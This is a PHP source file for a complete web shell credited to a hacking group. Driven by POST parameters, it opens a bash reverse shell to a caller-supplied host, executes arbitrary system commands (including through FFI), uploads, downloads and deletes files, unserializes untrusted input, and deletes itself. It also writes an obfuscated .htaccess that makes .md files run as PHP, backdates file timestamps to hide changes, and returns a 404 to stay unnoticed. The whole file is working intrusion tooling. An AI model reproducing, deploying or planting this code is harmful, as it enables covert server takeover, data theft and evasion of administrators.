<?php
/*
                    O       o O       o O       o
                    | O   o | | O   o | | O   o |
                    | | O | | | | O | | | | O | |
                    | o   O | | o   O | | o   O |
                    o       O o       O o       O
                                { Dark Net Alliance }

                        © 2019, <Cvar1984@BHSec>
              -----------------------------------------
              @author Cvar1984
              @license MIT
              @contributor BHSec

 */

/** {{{ Main class
 * Class: R2
 *
 */
class R2
{
    public static int $chunk_size = 1400;
    public static $write_a = null;
    public static $error_a = null;
    public static int $daemon = 0;
    public static string $shell = 'bash -i'; // bash
    public static string $htaccess = 'NqqGlcr+nccyvpngvba%2Sk-uggcq-cuc+.zq';
    /** {{{ Constructor
     * __construct
     *
     * @param bool $debug
     * @param int $time
     */
    public function __construct(bool $debug = true, int $time = 0)
    {
        if ($debug === true) {
            error_reporting(E_ALL);
        } else {
            error_reporting($debug);
        }

        error_log($debug);
        set_time_limit($time);
        $this->cwd = getcwd() . DIRECTORY_SEPARATOR;
        $this->cft = time();
    }
    /* }}} */
    /** {{{ Reverse shell
     * reverse
     *
     * @param string $host
     * @param int $port
     */
    public function reverse(string $host, int $port)
    {
        if (function_exists('pcntl_fork')) {
            $pid = pcntl_fork();
            if ($pid == -1) {
                exit(1);
            } elseif ($pid) {
                exit(0);
            } // Parent exits
            // Will only succeed if we forked
            if (posix_setsid() == -1) {
                exit(1);
            }
            R2::$daemon = 1;
        }
        // Remove any umask we inherited
        umask(0);

        // Open reverse connection
        $sock = fsockopen($host, $port, $errno, $errstr, 30);
        if (!$sock) {
            exit(1);
        }
        // Spawn shell process
        $descriptorspec = array(
            0 => array('pipe', 'r'), // stdin
            1 => array('pipe', 'w'), // stdout
            2 => array('pipe', 'w') // stderr
        );

        $process = proc_open(R2::$shell, $descriptorspec, $pipes);

        if (!is_resource($process)) {
            exit(1);
        }
        stream_set_blocking($pipes[0], 0);
        stream_set_blocking($pipes[1], 0);
        stream_set_blocking($pipes[2], 0);
        stream_set_blocking($sock, 0);
        while (1) {
            // Check for end of TCP connection
            if (feof($sock)) {
                break;
            }
            // Check for end of STDOUT
            if (feof($pipes[1])) {
                break;
            }

            $read_a = array($sock, $pipes[1], $pipes[2]);
            $num_changed_sockets = stream_select(
                $read_a,
                R2::$write_a,
                R2::$error_a,
                null
            );

            if (in_array($sock, $read_a)) {
                $input = fread($sock, R2::$chunk_size);
                fwrite($pipes[0], $input);
            }

            if (in_array($pipes[1], $read_a)) {
                $input = fread($pipes[1], R2::$chunk_size);
                fwrite($sock, $input);
            }

            if (in_array($pipes[2], $read_a)) {
                $input = fread($pipes[2], R2::$chunk_size);
                fwrite($sock, $input);
            }
        }

        fclose($sock);
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
    }
    /* }}} */
    /** {{{ Upload files from client to server
     * upload
     *
     * @param array $file
     */
    public function upload(array $file)
    {
        return move_uploaded_file(
            $file['tmp_name'],
            $this->cwd . $file['name']
        );
    }
    /* }}} */
    /** {{{ Remove given files
     * remove
     *
     */
    public function remove()
    {
        return unlink($_SERVER['SCRIPT_FILENAME']);
    }
    /* }}} */
    /** {{{ Write string to files
     * write
     *
     * @param string $name
     * @param string $file
     */
    public function write(string $name, string $file)
    {
        $file = str_rot13(urldecode($file));
        if (substr($this->cwd, -1) == DIRECTORY_SEPARATOR) {
            $this->changeTime($this->cwd . $name);
            file_put_contents($this->cwd . $name, $file);
            return touch($this->cwd . $name, $this->cft);
        } else {
            $this->changeTime($this->cwd . DIRECTORY_SEPARATOR . $name);
            file_put_contents($this->cwd . DIRECTORY_SEPARATOR . $name, $file);
            return touch($this->cwd . DIRECTORY_SEPARATOR, $this->cft);
        }
    }
    /* }}} */
    /** {{{ Write htaccess
     * htaccess
     *
     */
    public function htaccess()
    {
        return $this->write('.htaccess', R2::$htaccess);
    }
    /* }}} */
    /** {{{ Print help
     * help
     *
     * @param string $class
     */
    public function help(string $class)
    {
        $ref = new ReflectionClass($class);
        return json_encode(
            [
                'method' => $ref->getMethods(),
                'property' => $ref->getStaticProperties()
            ],
            JSON_PRETTY_PRINT
        );
    }
    /* }}} */
    /** {{{ Able to modif php class itself
     * debug
     *
     * @param string $class
     * @param string $property
     * @param string $value
     */
    public function debug(string $class, string $property, string $value)
    {
        $ref = new ReflectionClass($class);
        $ref->setStaticPropertyValue($property, $value);
    }
    /* }}} */
    /** {{{ General PHP info
     * info
     *
     */
    public function info()
    {
        ob_start();
        phpinfo();
        $s = ob_get_clean();
        $s = strip_tags($s, '<h2><th><td>');
        $s = preg_replace('/<th[^>]*>([^<]+)<\/th>/', '<info>\1</info>', $s);
        $s = preg_replace('/<td[^>]*>([^<]+)<\/td>/', '<info>\1</info>', $s);
        $t = preg_split(
            '/(<h2[^>]*>[^<]+<\/h2>)/',
            $s,
            -1,
            PREG_SPLIT_DELIM_CAPTURE
        );
        $r = array();
        $count = count($t);
        $p1 = '<info>([^<]+)<\/info>';
        $p2 = '/' . $p1 . '\s*' . $p1 . '\s*' . $p1 . '/';
        $p3 = '/' . $p1 . '\s*' . $p1 . '/';
        for ($i = 1; $i < $count; $i++) {
            if (preg_match('/<h2[^>]*>([^<]+)<\/h2>/', $t[$i], $matchs)) {
                $name = trim($matchs[1]);
                $vals = explode("\n", $t[$i + 1]);
                foreach ($vals as $val) {
                    if (preg_match($p2, $val, $matchs)) {
                        // 3cols
                        $r[$name][trim($matchs[1])] = array(
                            trim($matchs[2]),
                            trim($matchs[3])
                        );
                    } elseif (preg_match($p3, $val, $matchs)) {
                        // 2cols
                        $r[$name][trim($matchs[1])] = trim($matchs[2]);
                    }
                }
            }
        }
        return json_encode($r, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
    }
    /* }}} */
    /** {{{ Download files from server to client
     * download
     *
     * @param string $file
     */
    public function download(string $file)
    {
        $file = $this->cwd . $file;
        header("Content-Disposition: attachment; filename=" . basename($file));
        header("Content-Length: " . filesize($file));
        header("Content-Type: application/octet-stream;");
        readfile($file);
    }
    /* }}} */
    /** {{{ List directory
     * ls
     *
     * @param mixed $dir
     */
    public function ls($dir)
    {
        return json_encode(
            scandir($this->cwd . $dir),
            JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES
        );
    }
    /* }}} */
    /** {{{ Remove given files
     * rm
     *
     * @param string $file
     */
    public function rm(string $file)
    {
        if (substr($this->cwd, -1) == DIRECTORY_SEPARATOR) {
            return unlink($this->cwd . $file) . PHP_EOL;
        } else {
            return unlink($this->cwd . DIRECTORY_SEPARATOR . $file) . PHP_EOL;
        }
    }
    /* }}} */
    /** {{{ Serialize given string
     * serial
     *
     * @param string $data
     */
    public function serial(string $data)
    {
        return unserialize($data) . PHP_EOL;
    }
    /* }}} */
    /** {{{ Change directory
     * cd
     *
     * @param string $directory
     */
    public function cd(string $directory)
    {
        $this->cwd = $this->cwd . $directory;
        chdir($this->cwd);
    }
    /* }}} */
    /** {{{ Change file times
     * changeTime
     *
     * @param mixed $file
     */
    public function changeTime($file)
    {
        if (file_exists($file)) {
            $this->cft = filemtime($file);
        }
    }
    /* }}} */
    /** {{{ Arhive given files to zip
     * zip
     *
     * @param string $filename
     * @param mixed $file
     */
    public function zip(string $filename, $file)
    {
        $zip = new ZipArchive();
        if (substr($filename, -1) == DIRECTORY_SEPARATOR) {
            $zip->open($this->cwd . $filename, ZipArchive::CREATE);
            foreach ((array)$file as $files) {
                $zip->addFile($this->cwd . $files, basename($files));
            }
        } else {
            $zip->open(
                $this->cwd . DIRECTORY_SEPARATOR . $filename,
                ZipArchive::CREATE
            );
            foreach ((array)$file as $files) {
                $zip->addFile(
                    $this->cwd . DIRECTORY_SEPARATOR . $files,
                    basename($files)
                );
            }
        }

        $zip->close();
    }
    /* }}} */
    /** {{{ unzip given files
     * unzip
     *
     * @param mixed $filename
     * @param mixed $to
     */
    public function unzip($filename, $to)
    {
        $zip = new ZipArchive();
        if (substr($filename, -1) == DIRECTORY_SEPARATOR) {
            $zip->open($this->cwd . $filename);
            $zip->extractTo($this->cwd . $to);
        } else {
            $zip->open($this->cwd . DIRECTORY_SEPARATOR . $filename);
            $zip->extractTo($this->cwd . DIRECTORY_SEPARATOR . $to);
        }
        $zip->close();
    }
    /* }}} */
    /** {{{ Call system command
     * cmd
     *
     * @param string $command
     */
    public function cmd(string $command)
    {
        if (function_exists(system::class)) {
            system($command);
        } elseif (class_exists(FFI::class)) {
            $clib = 'libc.so';
            $ccode = <<<'CDEF'
int system(char const *cmd);
CDEF;
            $libc = FFI::cdef($ccode, $clib);
            $libc->system($command);
        }
    }
    /* }}} */
}
/* }}} */
/** {{{ MAIN
 */

$r2 = new R2(true, 0);

if (isset($_POST['debug'])
    && isset($_POST['property'])
    && isset($_POST['value'])) {
    echo $r2->debug($_POST['debug'], $_POST['property'], $_POST['value']);
}
if (isset($_POST['cd'])) {
    $r2->cd($_POST['cd']);
}
if (isset($_POST['host']) && isset($_POST['port'])) {
    $r2->reverse($_POST['host'], $_POST['port']);
} elseif (isset($_FILES['upload'])) {
    echo $r2->upload($_FILES['upload']);
} elseif (isset($_POST['remove'])) {
    echo $r2->remove();
} elseif (isset($_POST['htaccess'])) {
    echo $r2->htaccess();
} elseif (isset($_POST['name']) && isset($_POST['write'])) {
    echo $r2->write($_POST['name'], $_POST['write']);
} elseif (isset($_POST['help'])) {
    echo $r2->help($_POST['help']);
} elseif (isset($_POST['info'])) {
    echo $r2->info();
} elseif (isset($_POST['download'])) {
    $r2->download($_POST['download']);
} elseif (isset($_POST['ls'])) {
    echo $r2->ls($_POST['ls']);
} elseif (isset($_POST['rm'])) {
    echo $r2->rm($_POST['rm']);
} elseif (isset($_POST['serial'])) {
    echo $r2->serial($_POST['serial']);
} elseif (isset($_POST['zip']) && isset($_POST['file'])) {
    $r2->zip($_POST['zip'], $_POST['file']);
} elseif (isset($_POST['unzip']) && isset($_POST['to'])) {
    $r2->unzip($_POST['unzip'], $_POST['to']);
} elseif (isset($_POST['cmd'])) {
    $r2->cmd($_POST['cmd']);
} else {
    header('HTTP/1.0 404 Not Found', true, 404);
    exit(404);
}
/* }}}*/
